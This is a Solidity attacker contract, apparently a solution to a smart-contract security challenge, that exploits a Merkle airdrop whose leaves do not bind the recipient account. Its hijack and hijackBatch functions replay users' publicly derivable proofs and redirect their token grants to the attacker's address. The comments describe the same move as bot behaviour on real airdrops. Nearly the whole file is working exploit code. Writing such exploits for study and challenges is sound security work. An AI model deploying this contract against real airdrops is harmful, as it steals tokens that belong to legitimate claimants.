// SPDX-License-Identifier: MIT
// MERKLE-CLAIM HIJACK (unbound-recipient class).
// Technique: the leaf binds (index, amount) but not the account, and proofs
// are public/derivable — so the attacker recomputes each user's proof and
// claims their grant to themselves before the honest user does.
pragma solidity ^0.8.0;

import {MerkleAirdrop} from "../challenges/MerkleAirdrop.sol";
import {ERC20Mintable} from "../tokens/ERC20Mintable.sol";

contract MerkleHijackAttacker {
    MerkleAirdrop public immutable airdrop;
    address public immutable owner;

    constructor(address _airdrop) {
        airdrop = MerkleAirdrop(_airdrop);
        owner = msg.sender;
    }

    /// Steal one user's grant: the proof is recomputed from public info and
    /// the payout redirected to the attacker.
    function hijack(uint256 index, uint256 amount, bytes32[] calldata proof) external {
        airdrop.claim(index, owner, amount, proof);
    }

    /// Batch variant: hijack many indexes in one tx (bot behavior on real
    /// airdrops — every unclaimed leaf is fair game).
    function hijackBatch(uint256[] calldata indexes, uint256[] calldata amounts, bytes32[][] calldata proofs) external {
        for (uint256 i = 0; i < indexes.length; i++) {
            airdrop.claim(indexes[i], owner, amounts[i], proofs[i]);
        }
    }

    receive() external payable {}
}
